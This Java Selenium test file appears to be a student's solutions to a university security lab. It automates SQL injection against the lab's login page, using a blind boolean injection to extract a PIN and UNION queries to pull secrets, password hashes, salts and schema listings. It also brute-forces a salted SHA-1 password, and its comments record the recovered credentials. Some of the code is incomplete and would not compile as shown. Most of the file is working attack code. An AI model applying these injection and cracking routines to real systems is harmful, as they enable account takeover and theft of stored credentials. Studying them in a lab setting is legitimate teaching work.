import com.google.common.base.Charsets;
import com.google.common.hash.Hashing;
import driver.DriverBase;
import org.junit.jupiter.api.Test;
import org.openqa.selenium.By;

import java.util.concurrent.TimeUnit;

public class Injections extends DriverBase {
    @Test
    public void second() {
        driver.manage().timeouts().pageLoadTimeout(5, TimeUnit.MINUTES);
        String pin = "";
        driver.get("http://kbe.felk.cvut.cz/index.php");
        try {
            Thread.sleep(3000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        for(int i = 0; i<4; i++) {
            for (int l = 0; l < 10; l++) {
                String injection = "komartom' AND pin LIKE '" + pin + l + "%' #";
                waitForElement(driver, By.xpath("/html/body/main/form/input[1]"));
                System.out.println(pin);
                driver.findElement(By.xpath("/html/body/main/form/input[1]")).sendKeys(injection);
                driver.findElement(By.xpath("/html/body/main/form/input[2]")).sendKeys(" ");
                driver.findElement(By.xpath("/html/body/main/form/input[3]")).click();
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                boolean isSuccessChar = driver.findElement(By.xpath("/html/body/main/h1")).getText().contains("2-Step Verification");
                if(isSuccessChar) {
                    pin = pin + l;
                    driver.findElement(By.xpath("//*[@id=\"logout\"]")).click();
                    break;
                }
            }
        }
        System.out.print("PIN CODE IS  " + pin);
    }

    @Test
    public void third() {
        driver.manage().timeouts().pageLoadTimeout(5, TimeUnit.MINUTES);
        driver.get("http://kbe.felk.cvut.cz/index.php");
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        String injection = "badName' UNION SELECT secret AS username FROM users WHERE username LIKE 'komartom' #";
        driver.findElement(By.xpath("/html/body/main/form/input[1]")).sendKeys(injection);
        driver.findElement(By.xpath("/html/body/main/form/input[2]")).sendKeys(" ");
        driver.findElement(By.xpath("/html/body/main/form/input[3]")).click();
        try {
            Thread.sleep(2000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        String h2 = driver.findElement(By.xpath("/html/body/main/h2")).getText();
        String secret = h2.substring(8, h2.indexOf(","));

        System.out.print("SECRET IS  " + secret);
    }

    @Test
    public void fourth() {
        /*
        offset=10 UNION SELECT CONCAT("  USERNAME IS ", username, "  PASSWORD IS  ", password, "  SALT IS  ", salt, "   PIN IS", pin, "  SECRET IS  ", secret) AS date_time, '' AS message FROM users
        */
    }

    @Test
    public void fifth() {

        //  sha1($password . $salt)
        char[] alphabetAndNumbers = "abcdefghijklmnopqrstuvwxyz0123456789".toCharArray();

        //char[] password = Hashing.sha1().hashString();

        //  GFG g = new GFG();
    }

    //TODO EX8
    /*

    offset=10 UNION SELECT column_name AS message, '' AS date_time FROM information_schema.columns    --> Print All Columns
    offset=10 UNION SELECT table_name AS message, '' AS date_time FROM information_schema.tables  --> Print all Tables_name

    */


    //Exc 9
    /*

    offset=10 UNION SELECT date_time, base64_message_xor_key AS message FROM messages WHERE username = 'sinelser' -> Write my message

    offset=10 UNION SELECT base64_message_xor_key AS date_time, '' AS message FROM messages WHERE username = 'sinelser' --> write my XOR. AND it is LwoePAQIHH9YUlgWNgUHCSxXQg4fGlFefx8NECxEWRVFJgQXF39UWUBDDE8BOggXHCtEXQMWLAoFAHE=



offset=10 UNION SELECT base64_message_xor_key AS date_time, aes_encrypt_code AS message FROM messages

    */

    /*
     offset=10 UNION SELECT pin AS date_time, CONCAT(password, " ", salt, " ", pin, " ", secret) AS message FROM users WHERE username = 'komartom'

        Username = komartom
        HashedPas = 2d55131b6752f066ee2cc57ba8bf781b4376be85
        salt = kckct
        pin = 6607
        secret = JD5WXOFDCB7CVMMF
    */


    @Test
    public static void addSaltToDictionaryFile() {
        BufferedReader reader = new BufferedReader(new FileReader("/Users/sinelnikovserhii/CVUT/KBE/passCracker/combined_password_list.txt"));
        FileWriter myWriter = new FileWriter("/Users/sinelnikovserhii/CVUT/KBE/passCracker/passwordsWithSalt.txt");
        reader.lines().forEach(str -> {
            try {
                myWriter.write(str.concat("kckct\n"));
            } catch (IOException e) {
                e.printStackTrace();
            }
        });
    }

}

class Excerice5
{

    public static String answer = "";
    public static String myPass = "c524fc7812a556118414e12fc6be9b5ed022cd4f";


    static void generate(char[] arr, int i, String s, int len)
    {
        // base case
        if (i == 0) // when len has been reached
        {
            // print it out
            if(s.length() == 5) {
                String attempt = Hashing.sha1().hashString(s.concat("c6290"), Charsets.UTF_8).toString();
                if(attempt.equals(myPass)) {
                    System.out.println("PASS IS " + s);
                    answer = s;
                    return;
                }
            } else if(s.length() == 4) System.out.println("4");
            else if(s.length() == 6) System.out.println("6");;


            // cnt++;
            return;
        }

        // iterate through the array
        for (int j = 0; j < len; j++)
        {

            // Create new string with next character
            // Call generate again until string has
            // reached its len
            String appended = s + arr[j];
            generate(arr, i - 1, appended, len);
        }

        return;
    }

    // function to generate all possible passwords
    static void crack(char[] arr, int len)
    {
        // call for all required lengths
        for (int i = 1; i <= len; i++)
        {
            generate(arr, i, "", len);
        }
        System.out.print(answer);
    }

    // Driver code
    public static void main(String[] args)
    {
        char arr[] = "abcdefghijklmnopqrstuvwxyz0123456789".toCharArray();
        crack(arr, arr.length);
    }

}